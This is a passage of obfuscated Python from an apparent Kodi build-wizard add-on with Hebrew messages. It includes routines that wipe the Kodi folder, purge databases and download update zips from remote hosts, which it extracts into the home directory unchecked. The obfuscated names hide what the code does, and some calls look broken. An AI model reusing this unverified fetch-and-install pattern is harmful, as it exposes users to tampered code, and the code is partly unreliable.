				if OO00O0OOOO0OO0000 in EXCLUDES :pass #line:4168
				elif os .path .exists (os .path .join (ADDONS ,OO00O0OOOO0OO0000 )):pass #line:4169
				else :wiz .cleanHouse (O0OOOOO0OOOOOOO0O );O00O0O000OOO0O00O +=1 ;wiz .log (O0OOOOO0OOOOOOO0O );shutil .rmtree (O0OOOOO0OOOOOOO0O )#line:4170
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O000OOO0O00O ))#line:4171
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4172
	elif O0O00O000O0OO00O0 =='empty':#line:4173
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4174
			O00O0O000OOO0O00O =wiz .emptyfolder (ADDOND )#line:4175
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O000OOO0O00O ))#line:4176
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4177
	else :#line:4178
		OOO00O00O00OOOOOO =os .path .join (USERDATA ,'addon_data',O0O00O000O0OO00O0 )#line:4179
		if O0O00O000O0OO00O0 in EXCLUDES :#line:4180
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4181
		elif os .path .exists (OOO00O00O00OOOOOO ):#line:4182
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00O000O0OO00O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4183
				wiz .cleanHouse (OOO00O00O00OOOOOO )#line:4184
				try :#line:4185
					shutil .rmtree (OOO00O00O00OOOOOO )#line:4186
				except :#line:4187
					wiz .log ("Error deleting: %s"%OOO00O00O00OOOOOO )#line:4188
			else :#line:4189
				wiz .log ('Addon data for %s was not removed'%O0O00O000O0OO00O0 )#line:4190
	wiz .refresh ()#line:4191
def restoreit (OOO0O0O000O0OOOOO ):#line:4193
	if OOO0O0O000O0OOOOO =='build':#line:4194
		O000O0O0O00OO0O00 =freshStart ('restore')#line:4195
		if O000O0O0O00OO0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4196
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:4197
		wiz .skinToDefault ()#line:4198
	wiz .restoreLocal (OOO0O0O000O0OOOOO )#line:4199
def restoreextit (O0OOO0OOOO00O00O0 ):#line:4201
	if O0OOO0OOOO00O00O0 =='build':#line:4202
		O0000O000O0OO000O =freshStart ('restore')#line:4203
		if O0000O000O0OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4204
	wiz .restoreExternal (O0OOO0OOOO00O00O0 )#line:4205
def buildInfo (O0OO00O0OOO0OO0OO ):#line:4207
	if wiz .workingURL (ld (BL ))==True :#line:4208
		if wiz .checkBuild (O0OO00O0OOO0OO0OO ,'url'):#line:4209
			O0OO00O0OOO0OO0OO ,OO000OO000O0OOOOO ,OOOOO0OOOOO000OO0 ,O00O00O0OO00OO00O ,OOOOO0OO00OO0OO0O ,OO0O00000000000O0 ,O000OOOO000OO000O ,OO00OO0O00O0OO000 ,O000O0O0O0OO0OOOO ,OO0OO0O0OOO0OOO00 ,O000O0O00OO0OO0OO ,O000OOOOOOOOOOO0O ,O0OOO00OO0OO00OO0 =wiz .checkBuild (O0OO00O0OOO0OO0OO ,'all')#line:4210
			OO0OO0O0OOO0OOO00 ='Yes'if OO0OO0O0OOO0OOO00 .lower ()=='yes'else 'No'#line:4211
			O0OOOOO00O00OO0OO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO00O0OOO0OO0OO )#line:4212
			O0OOOOO00O00OO0OO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000OO000O0OOOOO )#line:4213
			if not O000OOOOOOOOOOO0O =="http://":#line:4214
				O0OO00OO00OOOOO00 =wiz .themeCount (O0OO00O0OOO0OO0OO ,False )#line:4215
				O0OOOOO00O00OO0OO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO00OO00OOOOO00 ))#line:4216
			O0OOOOO00O00OO0OO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0OO00OO0OO0O )#line:4217
			O0OOOOO00O00OO0OO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO0O0OOO0OOO00 )#line:4218
			O0OOOOO00O00OO0OO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0O00OO0OO0OO )#line:4219
			wiz .TextBox (ADDONTITLE ,O0OOOOO00O00OO0OO )#line:4220
		else :wiz .log ("Invalid Build Name!")#line:4221
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4222
def buildVideo (OO00OO000000000O0 ):#line:4224
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (ld (BL )))#line:4225
	if wiz .workingURL (ld (BL ))==True :#line:4226
		O00OO0O0O0000000O =wiz .checkBuild (OO00OO000000000O0 ,'preview')#line:4227
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO00OO000000000O0 )#line:4228
		if O00OO0O0O0000000O and not O00OO0O0O0000000O =='http://':playVideo (O00OO0O0O0000000O )#line:4229
		else :wiz .log ("[%s]Unable to find url for video preview"%OO00OO000000000O0 )#line:4230
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4231
def dependsList (O00OOOOOOOO00O00O ):#line:4233
	O0OO000O0OO00OO0O =os .path .join (ADDONS ,O00OOOOOOOO00O00O ,'addon.xml')#line:4234
	if os .path .exists (O0OO000O0OO00OO0O ):#line:4235
		OOO0OOO0000O00OO0 =open (O0OO000O0OO00OO0O ,mode ='r');O00O00O0OO0O00OO0 =OOO0OOO0000O00OO0 .read ();OOO0OOO0000O00OO0 .close ();#line:4236
		O000O0000000OOO0O =wiz .parseDOM (O00O00O0OO0O00OO0 ,'import',ret ='addon')#line:4237
		O0O00OO000OOO0OOO =[]#line:4238
		for OOOOO0000OOO0OO00 in O000O0000000OOO0O :#line:4239
			if not 'xbmc.python'in OOOOO0000OOO0OO00 :#line:4240
				O0O00OO000OOO0OOO .append (OOOOO0000OOO0OO00 )#line:4241
		return O0O00OO000OOO0OOO #line:4242
	return []#line:4243
def freshStart (install =None ,over =False ):#line:4249
    OOOO0OOOOOOO0O0O0 =os .path .abspath (HOME )#line:4251
    DP .create (ADDONTITLE ,'אנא המתן...')#line:4253
    O0O00OO0O000OOOO0 =sum ([len (OOOO00OO0O00OOOOO )for OOOO0O0O00O00O00O ,OOO0O000OO0O00OO0 ,OOOO00OO0O00OOOOO in os .walk (OOOO0OOOOOOO0O0O0 )]);OOO000O0000OOOOO0 =0 #line:4254
    DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4255
    EXCLUDES .append ('My_Builds')#line:4256
    EXCLUDES .append ('archive_cache')#line:4257
    EXCLUDES .append ('script.module.requests')#line:4258
    EXCLUDES .append ('script.module.certifi')#line:4259
    EXCLUDES .append ('script.module.future')#line:4260
    EXCLUDES .append ('script.module.chardet')#line:4261
    EXCLUDES .append ('script.module.idna')#line:4262
    EXCLUDES .append ('script.module.urllib3')#line:4263
    EXCLUDES .append ('plugin.video.telemedia')#line:4264
    EXCLUDES .append ('plugin.video.elementum')#line:4265
    EXCLUDES .append ('script.elementum.burst')#line:4266
    EXCLUDES .append ('script.elementum.burst-master')#line:4267
    EXCLUDES .append ('skin.estuary')#line:4268
    DP .update (0 ,"[COLOR yellow]מנקה קבצים ותיקיות, אנא המתן...[/COLOR]")#line:4271
    OOOOOOO0OO0O000OO =wiz .latestDB ('Addons')#line:4272
    for OOOO0O0O0O00O0OOO ,O0OO0OO0O0O000OOO ,O0O0OOO00OOO0O00O in os .walk (OOOO0OOOOOOO0O0O0 ,topdown =True ):#line:4273
        O0OO0OO0O0O000OOO [:]=[OO0O0O000O000OO0O for OO0O0O000O000OO0O in O0OO0OO0O0O000OOO if OO0O0O000O000OO0O not in EXCLUDES ]#line:4274
        for OOOOO0OOO0OO00O0O in O0O0OOO00OOO0O00O :#line:4275
            OOO000O0000OOOOO0 +=1 #line:4276
            O00O0OO0O00O0O0OO =OOOO0O0O0O00O0OOO .replace ('/','\\').split ('\\')#line:4277
            O0OO0OO0O0O000OO0 =len (O00O0OO0O00O0O0OO )-1 #line:4279
            if OOOOO0OOO0OO00O0O .endswith ('.db'):#line:4281
                try :#line:4282
                    if OOOOO0OOO0OO00O0O ==OOOOOOO0OO0O000OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOO0OOO0OO00O0O ,KODIV ),5 )#line:4283
                    else :os .remove (os .path .join (OOOO0O0O0O00O0OOO ,OOOOO0OOO0OO00O0O ))#line:4284
                except Exception as O0OO0OO0O00000000 :#line:4285
                    if not OOOOO0OOO0OO00O0O .startswith ('Textures13'):#line:4286
                        wiz .log ('Failed to delete, Purging DB',5 )#line:4287
                        wiz .log ("-> %s"%(str (O0OO0OO0O00000000 )),5 )#line:4288
                        wiz .purgeDb (os .path .join (OOOO0O0O0O00O0OOO ,OOOOO0OOO0OO00O0O ))#line:4289
            else :#line:4290
                try :os .remove (os .path .join (OOOO0O0O0O00O0OOO ,OOOOO0OOO0OO00O0O ))#line:4292
                except Exception as O0OO0OO0O00000000 :#line:4293
                    wiz .log ("Error removing %s"%os .path .join (OOOO0O0O0O00O0OOO ,OOOOO0OOO0OO00O0O ),5 )#line:4294
                    wiz .log ("-> / %s"%(str (O0OO0OO0O00000000 )),5 )#line:4295
        if DP .iscanceled ():#line:4296
            DP .close ()#line:4297
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4298
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת[/COLOR]"%COLOR2 )#line:4299
            sys .exit ()#line:4300
            return False #line:4301
    for OOOO0O0O0O00O0OOO ,O0OO0OO0O0O000OOO ,O0O0OOO00OOO0O00O in os .walk (OOOO0OOOOOOO0O0O0 ,topdown =True ):#line:4302
        O0OO0OO0O0O000OOO [:]=[O00OO000O0000000O for O00OO000O0000000O in O0OO0OO0O0O000OOO if O00OO000O0000000O not in EXCLUDES ]#line:4303
        for OOOOO0OOO0OO00O0O in O0OO0OO0O0O000OOO :#line:4304
          DP .update (100 ,'Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0OOO0OO00O0O ))#line:4306
          if OOOOO0OOO0OO00O0O not in ["Database","userdata","temp","addons","addon_data"]:#line:4307
             shutil .rmtree (os .path .join (OOOO0O0O0O00O0OOO ,OOOOO0OOO0OO00O0O ),ignore_errors =True ,onerror =None )#line:4308
        if DP .iscanceled ():#line:4309
            DP .close ()#line:4310
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת.[/COLOR]"%COLOR2 )#line:4311
            sys .exit ()#line:4312
    DP .close ()#line:4313
def clearCache ():#line:4321
		wiz .clearCache ()#line:4322
def fixwizard ():#line:4324
		wiz .fixwizard ()#line:4325
def totalClean ():#line:4327
        wiz .clearCache ()#line:4329
        wiz .clearPackages ('total')#line:4330
        clearThumb ('total')#line:4331
        cleanfornewbuild ()#line:4332
        wiz .emptyfolder (ADDOND )#line:4333
        wiz .emptyfolder (ADDONS )#line:4334
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי קאש מלא בוצע בהצלחה.[/COLOR]'%COLOR2 )#line:4335
def cleanfornewbuild ():#line:4336
		try :#line:4337
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4338
		except :#line:4339
			pass #line:4340
		try :#line:4341
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4342
		except :#line:4343
			pass #line:4344
		try :#line:4345
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","series.json"))#line:4346
		except :#line:4347
			pass #line:4348
def clearThumb (type =None ):#line:4349
	O0OO0OOOO0O0OOOOO =wiz .latestDB ('Textures')#line:4350
	if not type ==None :OOO000O0000O00OOO =1 #line:4351
	else :OOO000O0000O00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OO0OOOO0O0OOOOO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4352
	if OOO000O0000O00OOO ==1 :#line:4353
		try :wiz .removeFile (os .join (DATABASE ,O0OO0OOOO0O0OOOOO ))#line:4354
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OO0OOOO0O0OOOOO )#line:4355
		wiz .removeFolder (THUMBS )#line:4356
	else :wiz .log ('Clear thumbnames cancelled')#line:4358
	wiz .redoThumbs ()#line:4359
def purgeDb ():#line:4361
	import fnmatch #line:4362
	OOOOO00OO0O0O00O0 =[];O00O0O000O00O000O =[]#line:4363
	for OOOOOO00OOOO000OO ,O00O00OO000OOO00O ,O0OO0OOO00000O00O in os .walk (HOME ):#line:4364
		for O0OOO000O0O00OOO0 in fnmatch .filter (O0OO0OOO00000O00O ,'*.db'):#line:4365
			if O0OOO000O0O00OOO0 !='Thumbs.db':#line:4366
				O0OO0OOO00O0O00O0 =os .path .join (OOOOOO00OOOO000OO ,O0OOO000O0O00OOO0 )#line:4367
				OOOOO00OO0O0O00O0 .append (O0OO0OOO00O0O00O0 )#line:4368
				O0O0OOOO0O0O0OO0O =O0OO0OOO00O0O00O0 .replace ('\\','/').split ('/')#line:4369
				O00O0O000O00O000O .append ('(%s) %s'%(O0O0OOOO0O0O0OO0O [len (O0O0OOOO0O0O0OO0O )-2 ],O0O0OOOO0O0O0OO0O [len (O0O0OOOO0O0O0OO0O )-1 ]))#line:4370
	if KODIV >=16 :#line:4371
		OO0OOO0O000O0O00O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O0O000O00O000O )#line:4372
		if OO0OOO0O000O0O00O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4373
		elif len (OO0OOO0O000O0O00O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4374
		else :#line:4375
			for OO000O0O0000OO0O0 in OO0OOO0O000O0O00O :wiz .purgeDb (OOOOO00OO0O0O00O0 [OO000O0O0000OO0O0 ])#line:4376
	else :#line:4377
		OO0OOO0O000O0O00O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O0O000O00O000O )#line:4378
		if OO0OOO0O000O0O00O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4379
		else :wiz .purgeDb (OOOOO00OO0O0O00O0 [OO000O0O0000OO0O0 ])#line:4380
def help_install ():#line:4381
    import webbrowser #line:4382
    if xbmc .getCondVisibility ('system.platform.windows'):#line:4384
        webbrowser .open ('https://t.me/xbmc19')#line:4386
    else :#line:4387
        O000OO00000O0OO00 ='https://t.me/xbmc19'#line:4388
        xbmc .executebuiltin ("StartAndroidActivity(com.android.browser,android.intent.action.VIEW,,"+O000OO00000O0OO00 +")")#line:4389
        xbmc .executebuiltin ("StartAndroidActivity(com.android.chrome,,,"+O000OO00000O0OO00 +")")#line:4390
        xbmc .executebuiltin ("StartAndroidActivity(org.mozilla.firefox,android.intent.action.VIEW,,"+O000OO00000O0OO00 +")")#line:4391
        xbmc .executebuiltin ("StartAndroidActivity(org.sec.android.app.sbrowser,android.intent.action.VIEW,,"+O000OO00000O0OO00 +")")#line:4392
def fastupdatefirstbuild (OO0OOO00O0O000OOO ):#line:4396
    try :#line:4398
        checkidupdate ()#line:4399
    except Exception as O0000O000O00000O0 :#line:4400
        logging .warning ('בעיה בעדכון המהיר======================================')#line:4401
        logging .warning (str (O0000O000O00000O0 ))#line:4402
    O00OOO00O0OOO0O0O ,OO00O0OOOOOOOO00O =wiz .splitNotify (NOTIFICATION )#line:4404
    if not O00OOO00O0OOO0O0O ==False :#line:4405
        try :#line:4406
            O00OOO00O0OOO0O0O =int (O00OOO00O0OOO0O0O );OO0OOO00O0O000OOO =int (OO0OOO00O0O000OOO )#line:4407
            wiz .setS ("notedismiss","true")#line:4409
            if O00OOO00O0OOO0O0O ==OO0OOO00O0O000OOO :#line:4410
                wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OOO00O0OOO0O0O ),5 )#line:4411
            elif O00OOO00O0OOO0O0O >OO0OOO00O0O000OOO :#line:4413
                wiz .log ("[Notifications] id: %s"%str (O00OOO00O0OOO0O0O ),5 )#line:4414
                wiz .setS ('noteid',str (O00OOO00O0OOO0O0O ))#line:4415
                wiz .setS ("notedismiss","true")#line:4416
                wiz .log ("[Notifications] Complete",5 )#line:4419
        except Exception as O0000O000O00000O0 :#line:4420
            wiz .log ("Error on Notifications Window: %s"%str (O0000O000O00000O0 ),5 )#line:4421
def checkUpdate ():#line:4423
	O0OOOO0O0OOO0OOOO =wiz .getS ('disableupdate')#line:4424
	O0O0OOOOO0O0OOO00 =wiz .getS ('buildname')#line:4425
	OOOO00OOOOOOO0OOO =wiz .getS ('buildversion')#line:4426
	O000000OO0O0OO0OO =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:4427
	O000OOO0OO0OO00O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0O0OOOOO0O0OOO00 ).findall (O000000OO0O0OO0OO )#line:4428
	if len (O000OOO0OO0OO00O0 )>0 :#line:4429
		O0OO000O0OOO0O000 =O000OOO0OO0OO00O0 [0 ][0 ]#line:4430
		O00O0OOOOO0O000O0 =O000OOO0OO0OO00O0 [0 ][1 ]#line:4431
		O0OO00OOOO000OO0O =O000OOO0OO0OO00O0 [0 ][2 ]#line:4432
		wiz .setS ('latestversion',O0OO000O0OOO0O000 )#line:4433
		if O0OO000O0OOO0O000 >OOOO00OOOOOOO0OOO :#line:4434
			if O0OOOO0O0OOO0OOOO =='false':#line:4435
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOOO00OOOOOOO0OOO ,O0OO000O0OOO0O000 ),5 )#line:4436
				notify .updateWindow (O0O0OOOOO0O0OOO00 ,OOOO00OOOOOOO0OOO ,O0OO000O0OOO0O000 ,O00O0OOOOO0O000O0 ,O0OO00OOOO000OO0O )#line:4437
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOOO00OOOOOOO0OOO ,O0OO000O0OOO0O000 ),5 )#line:4438
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOOO00OOOOOOO0OOO ,O0OO000O0OOO0O000 ),5 )#line:4439
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",5 )#line:4440
def checkidupdate ():#line:4442
                OO00OOOO0OOO0O00O =[]#line:4443
                OO00OOOO0OOO0O00O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד עדכון אחרון.[/COLOR]'%COLOR2 ))#line:4444
                OO00OOOO0OOO0O00O [0 ].start ()#line:4446
                O000O00OOOOOO0OOO =wiz .workingURL (NOTIFICATION )#line:4447
                O0OOOOOO0000O000O =" Kodi Premium"#line:4448
                O00OOO0OOOO0OOOO0 =wiz .checkBuild (O0OOOOOO0000O000O ,'gui')#line:4449
                O0O0OOO0O000O00OO =O0OOOOOO0000O000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4450
                if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4452
                try :#line:4453
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOOOOO0000O000O ),'','אנא המתן')#line:4454
                except :#line:4455
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOOOOO0000O000O ))#line:4456
                O0OO00OO000OOO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OOO0O000O00OO )#line:4457
                if 'google'in O00OOO0OOOO0OOOO0 :#line:4460
                   googledrive_download (O00OOO0OOOO0OOOO0 ,O0OO00OO000OOO0O0 ,DP ,wiz .checkBuild (O0OOOOOO0000O000O ,'updatesize'))#line:4461
                else :#line:4464
                  downloader .download (O00OOO0OOOO0OOOO0 ,O0OO00OO000OOO0O0 ,DP )#line:4465
                xbmc .sleep (100 )#line:4466
                OOO00O0OOOO0O00O0 ='עדכון אחרון'#line:4467
                OO000OO000OOOOO0O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O0OOOO0O00O0 )#line:4468
                try :#line:4469
                    DP .update (0 ,OO000OO000OOOOO0O ,'','אנא המתן')#line:4470
                except :#line:4471
                    DP .update (0 ,OO000OO000OOOOO0O +'\n'+''+'\n'+'אנא המתן')#line:4472
                extract .all (O0OO00OO000OOO0O0 ,HOME ,DP ,title =OO000OO000OOOOO0O )#line:4473
                DP .close ()#line:4474
                try :os .remove (O0OO00OO000OOO0O0 )#line:4475
                except :pass #line:4476
                wiz .setS ("notedismiss","true")#line:4481
def checkidupdate_movie ():#line:4485
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מעדכן חבילות סרטים[/COLOR]'%COLOR2 )#line:4487
    wiz .setS ("notedismiss3","true")#line:4488
    O00OO000OO0O0O000 ='http://kodi.life/movie/update_movie.xml'#line:4489
    O0O0O0OO000O000O0 =wiz .workingURL (O00OO000OO0O0O000 )#line:4490
    O0O0O0O0OO0O0O000 =" Kodi Premium"#line:4492
    O0000O000OOOOO0OO ='http://kodi.life/movie/movie.zip'#line:4493
    O0OOO00O00O0O0000 =O0O0O0O0OO0O0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4494
    if not wiz .workingURL (O0000O000OOOOO0OO )==True :return #line:4495
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4496
    try :#line:4497
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O0O0OO0O0O000 ),'','אנא המתן')#line:4498
    except :#line:4499
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O0O0OO0O0O000 ))#line:4500
    O0OOOO0O000OOOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO00O00O0O0000 )#line:4501
    if 'google'in O0000O000OOOOO0OO :#line:4504
       googledrive_download (O0000O000OOOOO0OO ,O0OOOO0O000OOOOO0 ,DP ,wiz .checkBuild (O0O0O0O0OO0O0O000 ,'updatesize'))#line:4505
    else :#line:4507
      downloader .download (O0000O000OOOOO0OO ,O0OOOO0O000OOOOO0 ,DP )#line:4508
    xbmc .sleep (100 )#line:4509
    OO0OO00O000000O0O ='מעדכן סרטים'#line:4510
    O0O00O0OOOO0O0OO0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO00O000000O0O )#line:4511
    try :#line:4512
        DP .update (0 ,O0O00O0OOOO0O0OO0 ,'','אנא המתן')#line:4513
    except :#line:4514
        DP .update (0 ,O0O00O0OOOO0O0OO0 +'\n'+''+'\n'+'אנא המתן')#line:4515
    extract .all (O0OOOO0O000OOOOO0 ,HOME ,DP ,title =O0O00O0OOOO0O0OO0 )#line:4516
    try :os .remove (O0OOOO0O000OOOOO0 )#line:4517
    except :pass #line:4518
    DP .close ()#line:4519
    if INSTALLMETHOD ==1 :O00OO00O0O0O0OO0O =1 #line:4521
    elif INSTALLMETHOD ==2 :O00OO00O0O0O0OO0O =0 #line:4522
    else :DP .close ()#line:4523
def checkidupdatetele (info =''):#line:4527
    O00OO0000OOOOO0OO =wiz .workingURL (NOTIFICATION )#line:4528
    O0O000O00O0OOO0O0 =" Kodi Premium"#line:4529
    OOOO00O00O0O000O0 =wiz .checkBuild (O0O000O00O0OOO0O0 ,'gui')#line:4530
    OO0O0O0OO000000O0 =O0O000O00O0OOO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4531
    if not wiz .workingURL (OOOO00O00O0O000O0 )==True :return #line:4532
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4533
    OO0OO0OO00OO0O000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0O0OO000000O0 )#line:4534
    if 'google'in OOOO00O00O0O000O0 :#line:4537
       googledrive_download_BG (OOOO00O00O0O000O0 ,OO0OO0OO00OO0O000 ,DP2 ,wiz .checkBuild (O0O000O00O0OOO0O0 ,'updatesize'))#line:4538
    else :#line:4539
      downloaderbg .download3 (OOOO00O00O0O000O0 ,OO0OO0OO00OO0O000 ,DP2 )#line:4540
    xbmc .sleep (100 )#line:4541
    DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:4542
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:4543
    extract .all2 (OO0OO0OO00OO0O000 ,HOME ,DP2 )#line:4544
    DP2 .close ()#line:4545
    wiz .kodi17Fix ()#line:4549
    wiz .setS ("notedismiss","true")#line:4554
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:4555
    try :os .remove (OO0OO0OO00OO0O000 )#line:4556
    except :pass #line:4557
    backup_setting_file ()#line:4558
    if wiz .getS ("dragon")=='true':#line:4559
      try :#line:4560
          open_dragon_menu_hub ()#line:4561
      except Exception as OOO000000O000O0O0 :#line:4562
         logging .warning ('dragon hub errrrrrrror'+str (OOO000000O000O0O0 ))#line:4563
    else :#line:4564
      try :#line:4565
          close_dragon_menu_hub ()#line:4566
      except Exception as OOO000000O000O0O0 :#line:4567
         logging .warning ('dragon hub errrrrrrror'+str (OOO000000O000O0O0 ))#line:4568
    if wiz .getS ('sex')=='false':#line:4569
        sex_menu_luck (notify ='false')#line:4570
    O00OOO0OO00O00000 =[]#line:4575
    O00OOO0OO00O00000 .append (Thread (indicatorfastupdate ,info ))#line:4576
    O00OOO0OO00O00000 [0 ].start ()#line:4578
    xbmc .sleep (100 )#line:4580
    infobuild (True )#line:4581
def force_update ():#line:4586
    OOO00OOO00O0O0000 =xbmcgui .Dialog ()#line:4587
    OOO0OOO0O000OOO0O =OOO00OOO00O0O0000 .yesno (ADDONTITLE ,"האם לבצע עדכון מערכת?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:4588
    if OOO0OOO0O000OOO0O ==1 :#line:4589
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:4590
        O00O000O0000O00O0 =wiz .getS ("date_user")#line:4591
        if not O00O000O0000O00O0 =='':#line:4592
            import datetime #line:4593
            OO00O0O00OO00O000 =O00O000O0000O00O0 .split ('.')#line:4594
            O00O000O0000OO0O0 =datetime .date (int (OO00O0O00OO00O000 [2 ]),int (OO00O0O00OO00O000 [1 ]),int (OO00O0O00OO00O000 [0 ]))#line:4595
